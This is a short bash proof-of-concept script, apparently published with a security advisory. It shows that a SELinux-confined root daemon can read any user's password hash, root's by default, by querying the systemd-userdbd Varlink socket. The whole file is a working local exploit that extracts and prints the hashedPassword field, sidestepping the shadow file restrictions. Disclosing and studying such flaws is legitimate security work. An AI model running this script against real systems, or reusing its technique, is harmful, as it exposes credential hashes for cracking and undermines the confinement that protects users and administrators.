#!/bin/bash
#
# LinnemanLabs - Varlink UserDatabase hash-read PoC
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# a confined uid-0 daemon that cannot read shadow_t reads any user's
# password hash through the systemd-userdbd varlink
# hashedPassword is gated by SO_PEERCRED (uid) with no SELinux check
#
USER_TARGET="${1:-root}"
SOCK="/run/systemd/userdb/io.systemd.Multiplexer"

# confirm we cant directly read /etc/shadow
if head -1 /etc/shadow >/dev/null 2>&1; then
  echo "[!] we can already read /etc/shadow directly? not running from confined domain?"
fi

# ask varlink userdbd for the record, privileged fields are filled for a uid-0 caller
REC="$( varlinkctl call "${SOCK}" io.systemd.UserDatabase.GetUserRecord \
        "{\"userName\":\"${USER_TARGET}\",\"service\":\"io.systemd.Multiplexer\"}" 2>&1 )"

HASH="$( echo "${REC}" | jq -r .record.privileged.hashedPassword.[0] )"
if [ "${HASH}x" != "x" ]; then
  echo "[+] ${USER_TARGET} hash: ${HASH}"
else
  echo "[-] no hash returned (userdbd socket disabled, not uid-0, or user missing)"
  echo "${REC}"
fi

exit 0
